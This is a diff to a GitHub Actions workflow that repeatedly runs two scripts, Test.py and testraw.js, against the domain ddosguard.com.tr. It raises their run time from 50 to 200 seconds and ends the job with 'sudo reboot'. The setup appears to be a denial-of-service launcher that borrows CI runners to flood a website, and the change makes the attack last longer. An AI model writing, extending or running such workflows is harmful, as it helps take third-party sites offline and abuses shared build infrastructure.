@@ -22,7 +22,7 @@ jobs:
           chmod +x Test.py
           PIDS=()
           for i in {1..4}; do
-            timeout 50 python3 Test.py https://ddosguard.com.tr/ && node testraw.js https://ddosguard.com.tr/ 666
+            timeout 200 python3 Test.py https://ddosguard.com.tr/ && node testraw.js https://ddosguard.com.tr/ 666
             PIDS+=($!)
           done
           
@@ -31,7 +31,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 50
+        run: sleep 200
         
       - name: OK !
         run: sudo reboot
